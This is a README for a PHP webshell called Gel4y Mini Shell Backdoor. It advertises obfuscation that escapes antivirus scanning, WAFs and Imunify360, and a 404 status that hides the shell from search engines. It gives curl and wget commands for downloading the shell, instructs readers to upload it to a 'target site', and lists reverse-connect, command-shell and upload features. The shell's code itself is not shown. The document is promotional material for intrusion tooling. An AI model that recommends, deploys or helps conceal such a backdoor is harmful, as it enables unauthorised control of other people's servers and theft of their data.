<h2 align="center">Gel4y Mini Shell Backdoor</h2>

> A webshell that can bypass some system security.

<p align="center">
	<img src="https://img.shields.io/badge/PHP-7.4.3-yellowgreen">
	<img src="https://img.shields.io/badge/LICENSE-MIT-orange">
	<img src="https://img.shields.io/badge/Version-1.3-green">
</p>

Summary
----------

Gel4y Webshell is a backdoor built using the PHP programming language with the PHP procedural method in stealth mode where the file size is no more than 10KB, using the [nano shell](https://github.com/22XploiterCrew-Team/Shellmon) method so it can easily escape virus scanning. Every PHP function has been obfuscated to avoid some firewall systems (WAF) that block some PHP functions that are considered dangerous.

Now in the latest version of Gel4y the webshell will not be indexed by Google because the resulting status code is 404, this will make your webshell safe from being stolen by other hackers.
```
< HTTP/1.1 404 Not Found
< Host: localhost:1337
< Date: Wed, 06 Dec 2023 19:20:21 GMT
< Connection: close
< X-Powered-By: PHP/8.2.8
< Content-type: text/html; charset=UTF-8
```

### How To Use
You only need to download the files in this repo, there are several easy ways that you might try
* cURL
  ```curl https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php -o gel4y.php```
* wget
  ```wget https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php```

the method above will download and save to your computer, you only need to upload the webshell to the target site that you have and call it according to the name of the webshell file you downloaded.

ex: ***https://server.com/gel4y.php***.

Malware Scanning Log
--------
```
[2023-12-03 18:55:10] [INFO] Scan date: 2023-12-03 18:55:10
[2023-12-03 18:55:10] [INFO] Scanning ~/Gel4y-Mini-Shell-Backdoor/gel4y.php
[2023-12-03 18:55:10] [INFO] Mapping and retrieving checksums, please wait
[2023-12-03 18:55:10] [INFO] Found 1 files to check
[2023-12-03 18:55:10] [INFO] Checking files
[2023-12-03 18:55:11] [SUCCESS] Scan finished!
[2023-12-03 18:55:11] [INFO] Files scanned: 1
[2023-12-03 18:55:11] [INFO] Files edited: 0
[2023-12-03 18:55:11] [INFO] Files quarantined: 0
[2023-12-03 18:55:11] [INFO] Files whitelisted: 0
[2023-12-03 18:55:11] [INFO] Files ignored: 0
[2023-12-03 18:55:11] [INFO] Malware detected: 0
[2023-12-03 18:55:11] [INFO] Malware removed: 0
```

Features [UPDATED]
--------

* ***PHP BackConnect***
* ***Command Shell***
* ***Zip Upload (Auto Extract)***
* Obfuscated Code (not a feature in webshell)
* Multiple File Upload
* Create Folder and File
* File Download
#### Bypassed
* 403 Forbidden
* 406 Not Acceptable (according to luck :>)
* Imunify360 (not always successful, only 85% chance of success)

Preview
-------

<img src="https://images2.imgbox.com/a6/a8/WmrE2IOI_o.jpg" width="800" height="550"> 

Using the well-known css framework, Bootstrap version 4, so that the resulting display will adjust to your platform or more often it is called a responsive display.

## Thank's To
Thank you for the support given, we got references in making this backdoor from our friends, including:
- IndoXploit
- Indosec
- Marijuana Shell

### !!!
If there is an error in this webshell, please contribute with us.
